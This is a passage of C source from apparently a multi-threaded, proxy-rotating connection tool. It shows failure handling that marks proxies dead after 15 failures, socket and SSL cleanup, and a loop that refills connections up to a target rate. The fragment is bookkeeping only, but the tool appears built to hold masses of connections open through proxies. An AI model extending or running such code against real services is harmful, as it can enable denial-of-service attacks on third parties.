                            thread_stats[tid].connect_fail++;
                            if (curr->proxy) {
                                __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                curr->proxy->last_fail_time = now;
                                if (curr->proxy->fail_count >= 15) {
                                    curr->proxy->is_dead = 1;
                                }
                                if (curr->proxy->active_conns > 0) {
                                    __sync_fetch_and_sub(&curr->proxy->active_conns, 1);
                                    __sync_fetch_and_sub(&global_proxy_active_conns, 1);
                                }
                            } else {
                                if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
                            }
                            if (curr->ssl) SSL_free(curr->ssl);
                            if (curr->fd > 0) close(curr->fd);
                            if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                            
                            if (curr->prev) {
                                curr->prev->next = curr->next;
                            } else {
                                active_conns_list = curr->next;
                            }
                            if (curr->next) {
                                curr->next->prev = curr->prev;
                            }
                            free(curr);
                        }
                    }
                }
                curr = next_conn;
            }
        }
        
        int total = get_total_active_conns();
        if (total < args.rate) {
            int batch = (args.rate - total);
            int max_refill = args.is_vn_tcp ? 512 : 32;
            if (batch > max_refill) batch = max_refill;
            for (int b = 0; b < batch; b++) {
                if (get_total_active_conns() >= args.rate) break;
                spawn_connection(epoll_fd, tid);
            }
        }
    }
    return NULL;
}